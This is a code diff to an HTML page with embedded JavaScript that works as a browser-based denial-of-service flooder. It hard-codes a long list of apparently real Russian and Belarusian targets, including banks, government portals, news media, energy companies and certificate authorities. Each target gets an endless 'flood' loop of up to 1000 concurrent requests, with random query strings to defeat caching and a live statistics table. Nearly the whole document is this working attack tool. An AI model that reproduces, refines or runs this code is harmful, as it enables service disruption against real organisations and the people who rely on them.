+            'https://rbc.ru/',
+            'https://rec.gov.by/',
+            'https://relcom.ru',
+            'https://ria.ru/',
+            'https://ria.ru/lenta/',
+            'https://riafan.ru/',
+            'https://rk72.ru',
+            'https://rkn.gov.ru/',
+            'https://rmk-group.ru/ru/',
+            'https://roe.ru',
+            'https://royal.cash/',
+            'https://rsbis.ru/elektronnaya-podpis',
+            'https://rusvesna.su/',
+            'https://rzdlog.ru/',
+            'https://sb.by/',
+            'https://sberbank.ru/',
+            'https://severstal.com/',
+            'https://shop-rt.com/',
+            'https://sibur.ru/',
+            'https://smotrim.ru/',
+            'https://sputnik.by/',
+            'https://squaretrade.ru',
+            'https://stroi.gov.ru/',
+            'https://structure.mil.ru/structure/uc/info.htm',
+            'https://superchange.net',
+            'https://surgutneftegas.ru/',
+            'https://tass.ru/',
+            'https://tatneft.ru/',
+            'https://tmk-group.ru/',
+            'https://tvzvezda.ru/',
+            'https://uc-osnovanie.ru/',
+            'https://ucestp.ru',
+            'https://udcs.ru',
+            'https://ugmk.ua/',
+            'https://ukraina.ru/',
+            'https://uralkali.com/ru/',
+            'https://uslugi27.ru',
+            'https://vgtrk.ru/',
+            'https://vsoloviev.ru/',
+            'https://vtb.ru/',
+            'https://ww-pay.net/',
+            'https://www.1tv.ru/',
+            'https://www.24ecp.ru',
+            'https://www.agroros.ru/',
+            'https://www.ak-bars.ru/',
+            'https://www.akcia-bank.ru/',
+            'https://www.aksonbank.ru/',
+            'https://www.aktivbank.ru/',
+            'https://www.alefbank.ru/',
+            'https://www.alexbank.ru/',
+            'https://www.andjibank.ru/',
+            'https://www.aresbank.ru/',
+            'https://www.aspectbank.ru/',
+            'https://www.astralnalog.ru',
+            'https://www.atb.su/',
+            'https://www.autokreditbank.ru/',
+            'https://www.avangard.ru/rus/',
+            'https://www.avtogradbank.ru/',
+            'https://www.belapb.by/',
+            'https://www.belinfonalog.ru',
+            'https://www.belneftekhim.by/',
+            'https://www.center-inform.ru',
+            'https://www.cit-ufa.ru',
+            'https://www.crimea.kp.ru/',
+            'https://www.crypset.ru',
+            'https://www.e-portal.ru',
+            'https://www.eurosib.ru/',
+            'https://www.evraz.com/ru/',
+            'https://www.gazeta.ru/',
+            'https://www.gazprom.ru/',
+            'https://www.gazprombank.ru/',
+            'https://www.gosuslugi.ru/',
+            'https://www.icentr.ru',
+            'https://www.icvibor.ru',
+            'https://www.infotrust.ru',
+            'https://www.interfax.ru/',
+            'https://www.kartoteka.ru',
+            'https://www.kommersant.ru/',
+            'https://www.kt-69.ru',
+            'https://www.metalloinvest.com/',
+            'https://www.mfa.gov.by',
+            'https://www.mfk-bank.ru/',
+            'https://www.mininform.gov.by',
+            'https://www.mk.ru/',
+            'https://www.mos.ru/uslugi/',
+            'https://www.mpt.gov.by/',
+            'https://www.mvd.gov.by',
+            'https://www.nalog.gov.ru/',
+            'https://www.nbrb.by/',
+            'https://www.netex24.net',
+            'https://www.nornickel.com/',
+            'https://www.nucrf.ru/',
+            'https://www.nwudc.ru',
+            'https://www.open.ru/',
+            'https://www.otchet-online.ru',
+            'https://www.polymetalinternational.com/ru/',
+            'https://www.raiffeisen.ru/',
+            'https://www.rbc.ru/',
+            'https://www.rcarus.ru',
+            'https://www.roseltorg.ru',
+            'https://www.rt.com/',
+            'https://www.rzd.ru/',
+            'https://www.sb.by/',
+            'https://www.sberbank.ru/',
+            'https://www.severstal.com/',
+            'https://www.sibur.ru/',
+            'https://www.stv-it.ru',
+            'https://www.surgutneftegas.ru/',
+            'https://www.tatneft.ru/',
+            'https://www.tmk-group.ru/',
+            'https://www.tvr.by/',
+            'https://www.tvrmogilev.by/',
+            'https://www.ucpir.ru',
+            'https://www.unicreditbank.ru/',
+            'https://www.uralkali.com/ru/',
+            'https://www.vedomosti.ru/',
+            'https://www.vesti.ru/',
+            'https://www.vtb.ru/',
+            'https://www.y-center.ru',
+            'https://www.zemsky.ru/',
+            'https://ya.ru/',
+            'https://yandex.by/',
+            'https://yandex.ru/',
+            'https://yaplakal.com/',
+            'https://ychanger.net/',
+            'https://zakupki.gov.ru/',
+            'https://zarya.by/',
+            'https:/kk.bank/UdTs',
+        ]
+
+        var targetStats = {}
+        targetList.forEach((target) => {
+            targetStats[target] = { number_of_requests: 0, number_of_errored_responses: 0, error_message: '' }
+        })
+
+        function printStats() {
+            document.getElementById('stats').innerHTML = Object.entries(targetStats).map(([target, { number_of_requests, number_of_errored_responses, error_message }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td><td>' + error_message + '</td></tr>').join('')
+        }
+        setInterval(printStats, 1000)
 
         var CONCURRENCY_LIMIT = 1000
         var queue = []
 
         async function fetchWithTimeout(resource, options) {
-            const controller = new AbortController();
-            const id = setTimeout(() => controller.abort(), options.timeout);
+            const controller = new AbortController()
+            const id = setTimeout(() => controller.abort(), options.timeout)
             return fetch(resource, {
-                signal: controller.signal,
-                mode: 'no-cors'
+                method: 'GET',
+                mode: 'no-cors',
+                signal: controller.signal
             }).then((response) => {
-                clearTimeout(id);
-                return response;
+                clearTimeout(id)
+                return response
             }).catch((error) => {
-                clearTimeout(id);
-                throw error;
-            });
+                clearTimeout(id)
+                throw error
+            })
         }
 
         async function flood(target) {
-            while (true) {
+            for (var i = 0; ; i++) {
                 if (queue.length > CONCURRENCY_LIMIT) {
                     await queue.shift()
                 }
+                var rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
                 queue.push(
-                    fetchWithTimeout(target, { timeout: 2000 })
+                    fetchWithTimeout(target + rand, { timeout: 1000 })
                         .catch((error) => {
-                            if (error.code === 20 /* ABORT */) {
-                                return;
-                            }
-                            targets[target].number_of_errored_responses++;
-                            targets[target].error_message = error.message
+                            if (error.code === 20) { return } // ABORT
+                            targetStats[target].number_of_errored_responses++
+                            targetStats[target].error_message = error.message
                         })
                         .then((response) => {
                             if (response && !response.ok) {
-                                targets[target].number_of_errored_responses++;
-                                targets[target].error_message = response.statusText
+                                targetStats[target].number_of_errored_responses++
+                                targetStats[target].error_message = response.statusText
                             }
-                            targets[target].number_of_requests++;
+                            targetStats[target].number_of_requests++
                         })
-
-
                 )
             }
         }
 
-        //Start
-        Object.keys(targets).map(flood)
+        // Start
+        targetList.map(flood)
     </script>
 </body>
+
 </html>
